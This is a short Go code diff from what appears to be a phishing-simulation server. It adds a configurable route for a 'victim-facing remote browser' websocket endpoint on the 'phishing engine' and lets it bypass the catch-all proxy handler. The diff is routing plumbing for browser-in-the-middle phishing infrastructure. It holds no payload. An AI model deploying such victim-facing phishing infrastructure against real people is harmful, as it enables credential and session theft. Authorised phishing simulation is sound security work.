@@ -62,6 +62,7 @@ type Server struct {
 	repositories          *Repositories
 	proxyServer           *proxy.ProxyHandler
 	ja4Middleware         *middleware.JA4Middleware
+	remoteBrowserWSPath   string
 }
 
 // NewServer returns a new server
@@ -74,6 +75,7 @@ func NewServer(
 	repositories *Repositories,
 	logger *zap.SugaredLogger,
 	certMagicConfig *certmagic.Config,
+	remoteBrowserWSPath string,
 ) *Server {
 	// setup ja4 middleware for tls fingerprinting
 	ja4Middleware := middleware.NewJA4Middleware(logger)
@@ -118,6 +120,7 @@ func NewServer(
 		certMagicConfig:       certMagicConfig,
 		proxyServer:           proxyServer,
 		ja4Middleware:         ja4Middleware,
+		remoteBrowserWSPath:   remoteBrowserWSPath,
 	}
 }
 
@@ -342,6 +345,12 @@ func (s *Server) checkAndServeSharedAsset(c *gin.Context) bool {
 // checks if the request should be redirected
 // checks if the request is for a static page or static not found page
 func (s *Server) Handler(c *gin.Context) {
+	// pass through to the explicit Gin route for the victim remote browser WS endpoint
+	if strings.HasPrefix(c.Request.URL.Path, "/"+s.remoteBrowserWSPath+"/") {
+		c.Next()
+		return
+	}
+
 	if cacheEntry, ok := s.ja4Middleware.ConnectionFingerprints.Load(c.Request.RemoteAddr); ok {
 		if entry, ok := cacheEntry.(*middleware.FingerprintEntry); ok {
 			fingerprint := entry.Fingerprint
@@ -2023,6 +2032,11 @@ func (s *Server) renderDenyPage(
 
 // AssignRoutes assigns the routes to the server
 func (s *Server) AssignRoutes(r *gin.Engine) {
+	// victim-facing remote browser WS endpoint - lives on the phishing engine (r), not
+	// the admin engine, because it is served to the victim's browser. s.Handler has an
+	// explicit prefix check that calls c.Next() for this path so the catch-all proxy
+	// logic does not swallow the request before Gin can dispatch to ServeVictim.
+	r.GET("/"+s.remoteBrowserWSPath+"/:crID/:rbID", s.controllers.RemoteBrowser.ServeVictim)
 	r.Use(s.Handler)
 	r.NoRoute(s.handlerNotFound)
 }
